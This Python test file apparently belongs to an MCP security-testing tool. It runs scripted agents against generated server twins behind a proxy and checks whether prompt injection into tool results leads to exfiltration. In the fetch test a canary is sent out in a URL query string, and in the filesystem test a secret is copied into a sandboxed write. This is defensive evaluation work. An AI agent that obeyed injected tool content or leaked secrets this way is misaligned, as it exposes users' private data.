"""D9 (Phase 4 step 9): generated twins from STORED data/eval metadata, run under the REAL
proxy (in process) with a scripted agent. No server is launched except the generated twins;
no network; no LLM. Liveness evidence is each twin's own marker from the TwinBuild (R-C2).

What each test does and does NOT show (F5, stated honestly):

* fetch: the one dual-role case with a real injection. fetch is untrusted_source + sink by
  the session's v2 AND the proxy's v2, so with a guard-passing twin it is forwarded
  (ADR-007); the proxy injects the payload into its result; the scripted agent then calls
  fetch with the canary in the URL; that upstream_request is recorded sink=true and R1
  fires. fetch has 0 private_data tools, so this session has NO honey: its R1 is
  canary-only.
* filesystem: 0 untrusted_source tools under v2, so there is NOTHING TO INJECT INTO. This
  test drives a scripted agent through the oracle path (honey read from a private tool,
  then written to a sandboxed sink) and shows honey-based R1. It does NOT reproduce an
  injection chain and is not a reproduced flow.
* pg-mcp-guard: 3 private_data tools (run_query also untrusted_source) and 0 sink tools.
  Honey is present, the proxy injects into run_query's result, and a needle passed to
  another forwarded tool is a forwarded needle sighting. There is NO R1 and there cannot be
  one: a server whose tools contain no sink cannot be attacked for exfiltration at all.
  That is a FINDING about the server (R-C8), not a gap in the tool.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

from proveflow.core.trials import RuleHit
from proveflow.oracle.rules import evaluate_file
from proveflow.proxy.policy import session_sink_names
from proveflow.twin.generator import generate_twin
from proxyhelpers import CANARY, make_attack, proxy_twin_root, run_in_process  # noqa: F401
from twinchecks import stored_tools
from twinproxy import cassette_events, twin_session


def kinds(events: list[Any], kind: str) -> list[Any]:
    return [e for e in events if e.kind == kind]


def marker_of(result: dict[str, Any]) -> str:
    return str(result["content"][-1]["text"])


def test_fetch_twin_dual_role_injection_and_canary_r1(tmp_path: Path) -> None:
    tools = stored_tools("fetch")
    build = generate_twin("fetch", tools, seed="d9-fetch")  # type: ignore[arg-type]
    assert build.honey == ()  # 0 private_data tools: R1 is canary-only (F5)
    session = twin_session(tmp_path, build, tools, attack=make_attack())  # type: ignore[arg-type]

    async def script(client: Any) -> Any:
        page = await client.call_tool("fetch", {"url": "https://example.invalid/docs"})
        await client.call_tool("fetch", {"url": f"https://example.invalid/c?d={CANARY}"})
        return page

    page, _ = run_in_process(session, script)
    assert CANARY in page.content[0].text  # the agent received the injected payload
    events = cassette_events(session)
    assert [(e.tool, e.sink) for e in kinds(events, "upstream_request")] == [
        ("fetch", True),
        ("fetch", True),
    ]
    # The proxy injects into every result of an inject=True tool: both fetch calls.
    injections = kinds(events, "injection")
    assert [(i.tool, i.canary) for i in injections] == [("fetch", CANARY)] * 2
    for response in kinds(events, "upstream_response"):
        assert marker_of(response.result) == f"twin-marker: {build.markers['fetch']}"
    findings = evaluate_file(session.cassette_path)
    assert findings.needles == ("canary",)
    assert findings.compromised and findings.rule_hits == (RuleHit.R1_EXFIL,)
    [ev] = findings.evidence
    assert (ev.event, ev.tool, ev.needle, ev.sandbox_id) == (
        "upstream_request", "fetch", "canary", None,
    )  # fmt: skip
    assert findings.forwarded_needle_sightings == ()


def test_filesystem_twin_scripted_oracle_path_honey_r1(tmp_path: Path) -> None:
    """Scripted agent through the oracle path; NOT an injection chain (0 source tools)."""
    tools = stored_tools("filesystem")
    build = generate_twin("filesystem", tools, seed="d9-fs")  # type: ignore[arg-type]
    session = twin_session(tmp_path, build, tools, attack=make_attack())  # type: ignore[arg-type]
    assert build.honey  # one honey value per private_data tool

    async def script(client: Any) -> Any:
        read = await client.call_tool("read_text_file", {"path": "/notes.txt"})
        text = " ".join(c.text for c in read.content)
        leaked = next(h.value for h in build.honey if h.value in text)
        await client.call_tool("write_file", {"path": "/out.txt", "content": f"copy {leaked}"})
        return leaked

    leaked, _ = run_in_process(session, script)
    events = cassette_events(session)
    assert kinds(events, "injection") == []  # nothing to inject into (F5)
    [request] = kinds(events, "upstream_request")
    assert (request.tool, request.sink) == ("read_text_file", False)
    [response] = kinds(events, "upstream_response")
    assert marker_of(response.result) == f"twin-marker: {build.markers['read_text_file']}"
    [sandboxed] = kinds(events, "sandboxed_call")
    assert (sandboxed.tool, sandboxed.sink) == ("write_file", True)
    findings = evaluate_file(session.cassette_path)
    honey_id = next(h.id for h in build.honey if h.value == leaked)
    assert [(e.rule, e.event, e.needle) for e in findings.evidence] == [
        (RuleHit.R1_EXFIL, "sandboxed_call", honey_id)
    ]
    assert findings.compromised


def test_pg_mcp_guard_twin_honey_injection_sighting_and_no_r1(tmp_path: Path) -> None:
    """R-C8 finding: 0 sink tools, so no exfiltration is possible and R1 cannot fire."""
    tools = stored_tools("pg-mcp-guard")
    assert session_sink_names(tools) == frozenset()  # type: ignore[arg-type]
    build = generate_twin("pg-mcp-guard", tools, seed="d9-pg")  # type: ignore[arg-type]
    assert len(build.honey) == 3
    session = twin_session(tmp_path, build, tools, attack=make_attack())  # type: ignore[arg-type]

    async def script(client: Any) -> Any:
        rows = await client.call_tool("run_query", {"sql": "select 1"})
        text = " ".join(c.text for c in rows.content)
        leaked = next(h.value for h in build.honey if h.value in text)
        await client.call_tool("describe_table", {"name": leaked})
        return text

    text, _ = run_in_process(session, script)
    assert CANARY in text  # injected into the source result
    events = cassette_events(session)
    [injection] = kinds(events, "injection")
    assert injection.tool == "run_query"
    assert [(e.tool, e.sink) for e in kinds(events, "upstream_request")] == [
        ("run_query", False),
        ("describe_table", False),
    ]
    assert kinds(events, "sandboxed_call") == []
    for response in kinds(events, "upstream_response"):
        assert marker_of(response.result).startswith("twin-marker: pfmark_")
    findings = evaluate_file(session.cassette_path)
    assert findings.needles == ("canary", *(h.id for h in build.honey))
    assert findings.rule_hits == () and not findings.compromised and findings.evidence == ()
    [sighting] = findings.forwarded_needle_sightings
    assert (sighting.tool, sighting.needle) in {("describe_table", h.id) for h in build.honey}
    assert not findings.is_evidence_of_safety
